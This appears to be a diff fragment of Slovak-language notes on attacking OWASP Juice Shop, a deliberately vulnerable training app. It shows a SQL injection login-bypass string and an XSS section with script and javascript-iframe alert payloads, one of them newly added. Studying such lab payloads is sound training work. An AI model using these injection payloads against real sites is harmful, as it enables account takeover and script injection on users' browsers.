@@ -38,7 +38,11 @@ admin@juice-sh.op'--
 # Útok so zneužitím XSS
 4. 
 ```
-<script>alert(`xss`)</script> 
+<script>alert(`xss`)</script>
+```
+4/5 
+```
+<iframe src="javascript:alert(`xss`)">
 ```
 5. 
 ```
